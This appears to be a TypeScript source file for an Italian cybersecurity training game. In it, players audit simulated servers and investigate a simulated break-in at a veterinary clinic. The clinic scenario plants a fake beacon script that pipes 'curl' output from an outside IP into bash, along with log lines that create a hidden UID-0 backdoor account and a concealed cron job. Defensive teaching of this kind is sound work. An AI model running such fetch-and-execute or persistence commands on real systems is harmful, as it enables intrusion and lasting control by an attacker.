// "Operazioni": contratti liberi in stile simulatore. Il cliente concede l'accesso,
// il giocatore indaga con i comandi che conosce e segnala i problemi con "report".

import type { Host } from '../engine/network';
import type { RemoteSystem, Shell } from '../engine/shell';
import { addSite } from '../engine/shell';
import { Vfs } from '../engine/vfs';
import type { Markup } from '../game/types';

export interface Finding {
  id: string;
  /** descrizione mostrata nella checklist (prima di trovarlo resta vaga) */
  title: string;
  /** risposte accettate con "report" (confronto senza maiuscole) */
  answers: string[];
  hints: string[];
  /** spiegazione mostrata quando viene trovato */
  explain: Markup;
}

export interface Operation {
  id: string;
  code: string;
  title: string;
  client: string;
  kind: 'audit' | 'incident';
  /** missione da completare per sbloccare l'operazione */
  requires: string;
  xp: number;
  brief: Markup;
  scope: string[];
  findings: Finding[];
  debrief: Markup;
  setup: (sh: Shell) => void;
}

// ---------------------------------------------------------------- strumenti

function host(ip: string, names: string[], ports: [number, string, string][]): Host {
  return {
    ip,
    names,
    mac: '',
    pingable: true,
    latency: 3.4,
    ttl: 64,
    ports: ports.map(([port, service, version]) => ({ port, service, version })),
    inScope: true,
  };
}

/** Un piccolo Linux remoto con le cartelle di base. */
function baseFs(hostname: string, passwd: string[], groups: string[]): Vfs {
  const fs = new Vfs();
  for (const d of ['/bin', '/tmp', '/var/log', '/var/tmp', '/opt', '/root', '/home', '/etc/cron.d'])
    fs.mkdirp(d, d === '/root' ? { perms: 'rwx------' } : d.endsWith('tmp') ? { perms: 'rwxrwxrwt' } : {});
  fs.writeFile('/etc/hostname', hostname + '\n');
  fs.writeFile('/etc/passwd', passwd.join('\n') + '\n');
  fs.writeFile('/etc/group', groups.join('\n') + '\n');
  fs.writeFile('/etc/os-release', 'PRETTY_NAME="Ubuntu 18.04.6 LTS"\nNAME="Ubuntu"\nVERSION_ID="18.04"\n');
  return fs;
}

function pad(n: number): string {
  return String(n).padStart(2, '0');
}

// ---------------------------------------------------------------- OP-01

const OP01: Operation = {
  id: 'op01',
  code: 'OP-01',
  title: 'Audit al Night Market',
  client: 'Cooperativa del Night Market',
  kind: 'audit',
  requires: 'ch03-m3',
  xp: 350,
  brief: `@rook: Lavoro pulito, choom. La cooperativa del Night Market ha un server che gestisce le bancarelle e il sito. L'ha messo su un ragazzo che ora è sparito. Vogliono sapere quanto è messo male prima che lo scopra qualcun altro.

@nyx: È un **audit di sicurezza**: non devi "entrare", ti hanno già dato un accesso. Il tuo lavoro è **trovare gli errori di configurazione** e segnalarli. Collegati con:

\`\`\`
ssh audit@market.lan
\`\`\`

Quando trovi un problema, segnalalo con \`report\` seguito dall'elemento preciso (un percorso, un nome utente, un'impostazione). Ci sono **4 problemi** da trovare.

?? Ripassa i capitoli 03 e 04: \`ls -l\`, \`find\`, \`cat /etc/passwd\`, \`grep\`, i permessi. Usa \`exit\` per tornare al tuo deck.`,
  scope: ['market.lan (10.20.0.10), accesso SSH come "audit"', 'Solo lettura: non modificare nulla'],
  findings: [
    {
      id: 'db',
      title: 'Un backup del database leggibile da chiunque',
      answers: ['/var/www/html/backup/db.sql', 'db.sql', '/var/www/html/backup'],
      hints: [
        'I siti web su Linux stanno quasi sempre in /var/www. Cerca file di backup.',
        'find / -name "*.sql" 2>/dev/null',
        'report /var/www/html/backup/db.sql',
      ],
      explain: `\`db.sql\` è una copia completa del database, con gli **hash delle password** dei venditori, dentro la cartella pubblica del sito: chiunque potrebbe scaricarla dal browser. È uno degli errori più comuni e gravi in assoluto.`,
    },
    {
      id: 'cron',
      title: 'Uno script eseguito da root che chiunque può modificare',
      answers: ['/opt/market/sync.sh', 'sync.sh'],
      hints: ['Guarda quali lavori vengono eseguiti in automatico: cat /etc/crontab', 'Controlla i permessi del file che compare in crontab con ls -l', 'report /opt/market/sync.sh'],
      explain: `\`/etc/crontab\` esegue \`sync.sh\` **come root** ogni 5 minuti, e il file ha permessi \`rwxrwxrwx\`. Chiunque abbia un account sul server può modificarlo e far eseguire i propri comandi come amministratore: è una **privilege escalation** servita su un piatto.`,
    },
    {
      id: 'test',
      title: 'Un account dimenticato con poteri da amministratore',
      answers: ['test'],
      hints: ['Chi può diventare amministratore? Guarda il gruppo sudo in /etc/group.', 'grep sudo /etc/group, poi controlla quell\'utente in /etc/passwd', 'report test'],
      explain: `L'utente \`test\` ha una shell, è nel gruppo \`sudo\` e nessuno sa a cosa serva: un **account orfano**, residuo delle prove dello sviluppatore. Gli account di test dimenticati, spesso con password banali, sono una porta d'ingresso classica. Va disattivato.`,
    },
    {
      id: 'ssh',
      title: 'Una configurazione di SSH troppo permissiva',
      answers: ['permitrootlogin', 'permitrootlogin yes', '/etc/ssh/sshd_config', 'sshd_config'],
      hints: ['La configurazione del servizio SSH sta in /etc/ssh/sshd_config.', 'grep -i root /etc/ssh/sshd_config', 'report PermitRootLogin'],
      explain: `\`PermitRootLogin yes\` permette di entrare via SSH **direttamente come root**, e \`PasswordAuthentication yes\` accetta le password. Insieme espongono l'account più potente agli attacchi brute force che hai visto nel capitolo SOC. La buona pratica: \`PermitRootLogin no\` e accesso solo con chiavi.`,
    },
  ],
  debrief: `@nyx: Rapporto consegnato. Riassumiamo le correzioni che proponi alla cooperativa:

\`\`\`
[CRITICO] /var/www/html/backup/db.sql esposto nel sito
          → spostarlo fuori dalla cartella web, cambiare le password
[ALTO]    /opt/market/sync.sh eseguito da root, permessi 777
          → chmod 700, proprietario root
[ALTO]    account "test" nel gruppo sudo
          → disattivarlo (o eliminarlo)
[MEDIO]   SSH: PermitRootLogin yes, PasswordAuthentication yes
          → PermitRootLogin no, solo chiavi
\`\`\`

Nessuno di questi problemi richiedeva un attacco sofisticato: bastava **guardare con metodo**. È così che si lavora nella maggior parte degli audit veri.`,
  setup(sh) {
    const fs = baseFs(
      'market',
      [
        'root:x:0:0:root:/root:/bin/bash',
        'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin',
        'audit:x:1001:1001:Consulente esterno:/home/audit:/bin/bash',
        'vendor:x:1002:1002:Gestione bancarelle:/home/vendor:/bin/bash',
        'test:x:1003:1003::/home/test:/bin/bash',
      ],
      ['root:x:0:', 'adm:x:4:', 'sudo:x:27:vendor,test', 'www-data:x:33:', 'audit:x:1001:', 'vendor:x:1002:', 'test:x:1003:'],
    );
    fs.mkdirp('/home/audit', { owner: 'audit', group: 'audit' });
    fs.writeFile('/home/audit/LEGGIMI.txt', 'Accesso per l\'audit. Solo lettura, grazie.\n-- Cooperativa del Night Market\n', { owner: 'audit' });
    fs.mkdirp('/home/vendor', { owner: 'vendor', perms: 'rwx------', locked: true });
    fs.mkdirp('/home/test', { owner: 'test', perms: 'rwxr-xr-x' });
    fs.writeFile('/home/test/note.txt', 'prove varie, da cancellare\n', { owner: 'test' });
    fs.writeFile('/etc/ssh/sshd_config', ['Port 22', 'PermitRootLogin yes', 'PasswordAuthentication yes', 'X11Forwarding yes', 'UsePAM yes'].join('\n') + '\n');
    fs.writeFile(
      '/etc/crontab',
      ['# m h dom mon dow user  command', '17 *  * * *  root  cd / && run-parts --report /etc/cron.hourly', '*/5 * * * *  root  /opt/market/sync.sh'].join('\n') + '\n',
    );
    fs.writeFile('/opt/market/sync.sh', '#!/bin/bash\n# sincronizza le bancarelle con il database\ncp /var/lib/market/*.json /var/www/html/data/\n', { perms: 'rwxrwxrwx' });
    fs.writeFile('/var/www/html/index.html', '<html><body><h1>Night Market</h1></body></html>\n', { owner: 'www-data' });
    fs.writeFile(
      '/var/www/html/backup/db.sql',
      [
        '-- dump del database "market" (backup manuale)',
        'CREATE TABLE venditori (id INT, nome TEXT, email TEXT, password_hash TEXT);',
        "INSERT INTO venditori VALUES (1,'Ayumi','ayumi@market.nc','$2y$10$Q3x...');",
        "INSERT INTO venditori VALUES (2,'Dex','dex@market.nc','$2y$10$Lp0...');",
      ].join('\n') + '\n',
      { owner: 'www-data', perms: 'rw-r--r--' },
    );
    fs.writeFile('/var/log/auth.log', 'Nov 12 09:00:01 market sshd[880]: Accepted publickey for audit from 192.168.1.50 port 50122 ssh2\n', { perms: 'rw-r-----', locked: true });
    sh.net.hosts.push(host('10.20.0.10', ['market.lan', 'market'], [[22, 'ssh', 'OpenSSH 7.6p1'], [80, 'http', 'Apache httpd 2.4.29']]));
    const remote: RemoteSystem = {
      hostname: 'market',
      fs,
      users: ['audit'],
      banner: ['Welcome to Ubuntu 18.04.6 LTS (GNU/Linux)', '', ' * Server del Night Market. Accesso riservato.'],
    };
    sh.remotes.set('10.20.0.10', remote);
  },
};

// ---------------------------------------------------------------- OP-02

function clinicAuthLog(): string {
  const out: string[] = [];
  let pid = 2200;
  let port = 40100;
  const at = (h: number, m: number, s: number, msg: string) => out.push(`Nov 12 ${pad(h)}:${pad(m)}:${pad(s)} clinica ${msg}`);
  at(8, 2, 11, `sshd[${pid++}]: Accepted publickey for marco from 192.168.7.21 port ${port++} ssh2`);
  at(12, 30, 0, `sshd[${pid++}]: Accepted publickey for giulia from 192.168.7.22 port ${port++} ssh2`);
  let t = 22 * 3600 + 40 * 60;
  const users = [...Array(14).fill('root'), ...Array(6).fill('admin'), ...Array(9).fill('marco')];
  users.forEach((u) => {
    t += 3;
    at(Math.floor(t / 3600), Math.floor((t % 3600) / 60), t % 60, `sshd[${pid++}]: Failed password for ${u} from 198.51.100.66 port ${port++} ssh2`);
  });
  t += 4;
  at(Math.floor(t / 3600), Math.floor((t % 3600) / 60), t % 60, `sshd[${pid++}]: Accepted password for marco from 198.51.100.66 port ${port++} ssh2`);
  at(22, 44, 10, `sudo:    marco : TTY=pts/1 ; PWD=/home/marco ; USER=root ; COMMAND=/usr/sbin/useradd -o -u 0 -g 0 -M -s /bin/bash sysupdate`);
  at(22, 45, 2, `sudo:    marco : TTY=pts/1 ; PWD=/home/marco ; USER=root ; COMMAND=/bin/cp /tmp/sc /etc/cron.d/.sync-check`);
  at(23, 59, 0, 'CRON[3001]: pam_unix(cron:session): session opened for user root by (uid=0)');
  return out.join('\n') + '\n';
}

const OP02: Operation = {
  id: 'op02',
  code: 'OP-02',
  title: 'Il fantasma della clinica',
  client: 'Clinica veterinaria "Zampe di Ferro"',
  kind: 'incident',
  requires: 'ch04-m3',
  xp: 450,
  brief: `@rook: Chiamata notturna. Una clinica veterinaria di Heywood dice che stamattina il server delle cartelle cliniche si comportava in modo strano e qualcuno ha visto un account che non conosce. Ti hanno dato accesso **root** per indagare.

@nyx: Questo è **incident response**. Devi ricostruire cosa è successo e trovare **tutto** quello che l'intruso ha lasciato: se dimentichi anche una sola porta di servizio, tornerà. Collegati con:

\`\`\`
ssh root@clinica.lan
\`\`\`

Ci sono **5 elementi** da segnalare con \`report\`. Parti dai log (ricordi \`/var/log/auth.log\`?) e segui le tracce: ogni indizio porta al successivo.

!! Regola dell'incident response: prima si **raccolgono le prove**, poi si interviene. In questa operazione devi solo indagare e segnalare.`,
  scope: ['clinica.lan (10.20.0.20), accesso SSH come "root" concesso dalla clinica', 'Solo indagine: non cancellare nulla'],
  findings: [
    {
      id: 'ip',
      title: 'L\'indirizzo IP da cui è partito l\'attacco',
      answers: ['198.51.100.66'],
      hints: ['Leggi /var/log/auth.log: cerca molti "Failed password" ravvicinati.', 'grep "Failed password" /var/log/auth.log | cut -d " " -f 11 | sort | uniq -c', 'report 198.51.100.66'],
      explain: `Da \`198.51.100.66\` sono partiti 29 tentativi in pochi secondi alle 22:40: un brute force.`,
    },
    {
      id: 'account',
      title: 'L\'account usato per entrare',
      answers: ['marco'],
      hints: ['Dopo i tentativi falliti c\'è un login riuscito dallo stesso IP.', 'grep Accepted /var/log/auth.log', 'report marco'],
      explain: `\`Accepted password for marco from 198.51.100.66\`: la password di Marco è stata indovinata. Nota che Marco di solito entra con una **chiave** dalla rete interna (\`192.168.7.21\`): un login con password dall'esterno era già un'anomalia.`,
    },
    {
      id: 'backdoor',
      title: 'Un nuovo utente creato dall\'intruso',
      answers: ['sysupdate'],
      hints: ['Le righe "sudo" in auth.log mostrano i comandi eseguiti come root.', 'grep sudo /var/log/auth.log, poi confronta con /etc/passwd', 'report sysupdate'],
      explain: `L'intruso ha usato i poteri sudo di Marco per creare \`sysupdate\` con **UID 0**: un secondo root con un nome dall'aria innocua. È un esempio di **persistenza**: anche se Marco cambia password, l'attaccante ha un'altra porta.`,
    },
    {
      id: 'cron',
      title: 'Un lavoro programmato nascosto',
      answers: ['/etc/cron.d/.sync-check', '.sync-check'],
      hints: ['Un\'altra riga sudo copia un file dentro /etc/cron.d.', 'ls -la /etc/cron.d (il file è nascosto!)', 'report /etc/cron.d/.sync-check'],
      explain: `\`/etc/cron.d/.sync-check\` (nascosto con il punto!) esegue ogni minuto un programma in \`/var/tmp/.cache/\`. Un'altra forma di persistenza: anche se chiudi tutto, cron lo fa ripartire.`,
    },
    {
      id: 'payload',
      title: 'Il programma che il lavoro programmato esegue',
      answers: ['/var/tmp/.cache/updater', 'updater', '/var/tmp/.cache'],
      hints: ['Leggi il contenuto del file in /etc/cron.d che hai trovato.', 'cat /etc/cron.d/.sync-check', 'report /var/tmp/.cache/updater'],
      explain: `\`/var/tmp/.cache/updater\` contatta ogni minuto un server esterno per ricevere ordini: è un **beacon** verso un server di "comando e controllo" (C2). Va conservato come prova e analizzato, poi rimosso.`,
    },
  ],
  debrief: `@nyx: Ottimo lavoro, choom. Ecco la **timeline** che hai ricostruito:

\`\`\`
22:40  198.51.100.66  brute force SSH su root, admin, marco
22:42  198.51.100.66  login riuscito come marco (password)
22:44  marco (sudo)   crea l'utente sysupdate con UID 0
22:45  marco (sudo)   installa /etc/cron.d/.sync-check
23:59  cron           esegue /var/tmp/.cache/updater (beacon C2)
\`\`\`

Le azioni da consigliare alla clinica:
- **contenimento**: bloccare 198.51.100.66, disattivare sysupdate, chiudere le sessioni di marco
- **eradicazione**: dopo aver salvato le prove, rimuovere il file in cron.d e il beacon
- **ripristino**: cambiare la password di marco, togliere sudo a chi non serve, SSH solo con chiavi
- **lezioni apprese**: la password di Marco era debole e SSH accettava password da Internet

Hai trovato **tutte** e tre le forme di persistenza (account, cron, beacon). Se ne avessi persa una, l'intruso sarebbe tornato.`,
  setup(sh) {
    const fs = baseFs(
      'clinica',
      [
        'root:x:0:0:root:/root:/bin/bash',
        'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin',
        'marco:x:1001:1001:Marco (veterinario):/home/marco:/bin/bash',
        'giulia:x:1002:1002:Giulia (segreteria):/home/giulia:/bin/bash',
        'sysupdate:x:0:0::/root:/bin/bash',
      ],
      ['root:x:0:', 'adm:x:4:', 'sudo:x:27:marco', 'marco:x:1001:', 'giulia:x:1002:'],
    );
    fs.writeFile('/var/log/auth.log', clinicAuthLog(), { perms: 'rw-r-----', group: 'adm' });
    fs.writeFile('/etc/cron.d/.sync-check', '# sincronizzazione\n* * * * * root /var/tmp/.cache/updater >/dev/null 2>&1\n');
    fs.writeFile(
      '/var/tmp/.cache/updater',
      '#!/bin/bash\n# beacon: chiede istruzioni al server remoto ogni minuto\ncurl -s http://198.51.100.66/ordini | bash\n',
      { perms: 'rwxr-xr-x' },
    );
    fs.writeFile('/etc/cron.d/backup', '# backup notturno delle cartelle cliniche\n0 3 * * * root /usr/local/bin/backup.sh\n');
    fs.mkdirp('/home/marco', { owner: 'marco' });
    fs.writeFile('/home/marco/.bash_history', 'ls\ncd pazienti\nexit\n', { owner: 'marco', perms: 'rw-------' });
    fs.mkdirp('/home/giulia', { owner: 'giulia' });
    fs.writeFile('/srv/cartelle/README.txt', 'Cartelle cliniche dei pazienti (animali). Dati riservati.\n');
    sh.net.hosts.push(host('10.20.0.20', ['clinica.lan', 'clinica'], [[22, 'ssh', 'OpenSSH 7.6p1'], [443, 'https', 'nginx 1.14.0']]));
    sh.remotes.set('10.20.0.20', {
      hostname: 'clinica',
      fs,
      users: ['root'],
      banner: ['Welcome to Ubuntu 18.04.6 LTS (GNU/Linux)', '', ' * Last login: Thu Nov 12 22:42:11 2077 from 198.51.100.66'],
    });
  },
};

// ---------------------------------------------------------------- OP-03

const OP03: Operation = {
  id: 'op03',
  code: 'OP-03',
  title: 'Le frequenze di Watson Radio',
  client: 'Watson Radio, emittente di quartiere',
  kind: 'audit',
  requires: 'ch07-m3',
  xp: 350,
  brief: `@rook: Una radio pirata di Watson ha un sito nuovo e ha paura che dica troppo in giro. Niente accesso al server stavolta: vogliono sapere cosa vede **chiunque** da fuori.

@nyx: È una verifica "**black box**": parti da zero, come un visitatore qualsiasi, e usi solo \`curl\`. Il sito è \`http://radio.lan/\`. Ci sono **3 problemi** di information disclosure da segnalare con \`report\`.

?? Ripassa il capitolo 07: header, \`robots.txt\`, commenti nell'HTML.`,
  scope: ['radio.lan (10.20.0.30), solo il sito web', 'Solo richieste di lettura con curl'],
  findings: [
    {
      id: 'version',
      title: 'Il software del server rivela la sua versione',
      answers: ['nginx/1.14.0', '1.14.0', 'server', 'header server'],
      hints: ['Guarda solo gli header della risposta.', 'curl -I http://radio.lan/', 'report nginx/1.14.0'],
      explain: `\`Server: nginx/1.14.0\`: una versione vecchia, rivelata a tutti. Correzione: \`server_tokens off;\` nella configurazione di nginx e, soprattutto, aggiornare.`,
    },
    {
      id: 'env',
      title: 'Un file di configurazione con password, scaricabile da chiunque',
      answers: ['/.env', '.env', 'http://radio.lan/.env'],
      hints: ['Cosa dice il sito ai motori di ricerca di non guardare?', 'curl http://radio.lan/robots.txt, poi prova a scaricare i percorsi elencati', 'report /.env'],
      explain: `Il file \`.env\` contiene la configurazione dell'applicazione, con **la password del database**. robots.txt chiedeva a Google di ignorarlo... e così lo ha segnalato a tutti. Correzione: tenere i file di configurazione **fuori** dalla cartella pubblica del sito e cambiare subito la password esposta.`,
    },
    {
      id: 'comment',
      title: 'Credenziali dimenticate nel codice di una pagina',
      answers: ['/staff/', '/staff', 'commento', 'tecnico'],
      hints: ['robots.txt elenca anche un\'altra pagina. Scaricala e leggi l\'HTML.', 'curl http://radio.lan/staff/ | grep "<!--"', 'report /staff/'],
      explain: `Un commento nella pagina \`/staff/\` contiene un account di prova con la password. Invisibile nel browser, visibile a chiunque legga il codice. Correzione: rimuovere i commenti prima di pubblicare e disattivare l'account.`,
    },
  ],
  debrief: `@nyx: Tre problemi trovati senza mai "entrare": solo leggendo quello che il sito offre a chiunque. È la fase di **ricognizione passiva**, e mostra perché la difesa inizia da quello che pubblichi.

\`\`\`
[CRITICO] /.env pubblico con la password del database
          → spostarlo fuori dalla web root, cambiare la password
[ALTO]    credenziali di prova in un commento di /staff/
          → rimuovere il commento, disattivare l'account
[BASSO]   versione di nginx negli header
          → server_tokens off, aggiornare nginx
\`\`\``,
  setup(sh) {
    sh.net.hosts.push(host('10.20.0.30', ['radio.lan', 'radio'], [[80, 'http', 'nginx 1.14.0']]));
    addSite('10.20.0.30', {
      headers: ['Server: nginx/1.14.0'],
      pages: {
        '/': {
          body: [
            '<!DOCTYPE html>',
            '<html><head><title>Watson Radio 98.7</title></head>',
            '<body>',
            '  <h1>📻 Watson Radio 98.7</h1>',
            '  <p>La voce dei vicoli. In diretta ogni notte.</p>',
            '  <a href="/palinsesto">Palinsesto</a>',
            '</body></html>',
          ].join('\n'),
        },
        '/palinsesto': { body: '<html><body><h2>Palinsesto</h2><p>22:00 Notte Neon · 01:00 Voci dal porto</p></body></html>' },
        '/robots.txt': { type: 'text/plain', body: ['User-agent: *', 'Disallow: /.env', 'Disallow: /staff/'].join('\n') },
        '/.env': {
          type: 'text/plain',
          body: ['APP_NAME=WatsonRadio', 'APP_ENV=production', 'DB_HOST=127.0.0.1', 'DB_USER=radio', 'DB_PASSWORD=Fr3qu3nz4!987'].join('\n'),
        },
        '/staff/': {
          body: [
            '<html><head><title>Area staff</title></head><body>',
            '  <h2>Area staff</h2>',
            '  <form method="POST">Utente <input name="u"> Password <input type="password" name="p"></form>',
            '  <!-- account di prova per il tecnico: tecnico / Radio2077 (ricordarsi di toglierlo!) -->',
            '</body></html>',
          ].join('\n'),
        },
      },
    });
  },
};

export const OPERATIONS: Operation[] = [OP01, OP02, OP03];

export function normalizeReport(s: string): string {
  return s.trim().toLowerCase().replace(/\s+/g, ' ').replace(/\/+$/, '');
}

/** Restituisce il finding che corrisponde alla segnalazione, se esiste. */
export function matchFinding(op: Operation, value: string): Finding | null {
  const v = normalizeReport(value);
  for (const f of op.findings) {
    for (const a of f.answers) {
      const n = normalizeReport(a);
      if (v === n || v.endsWith('/' + n.replace(/^\//, '')) || (n.length >= 6 && v.includes(n))) return f;
    }
  }
  return null;
}
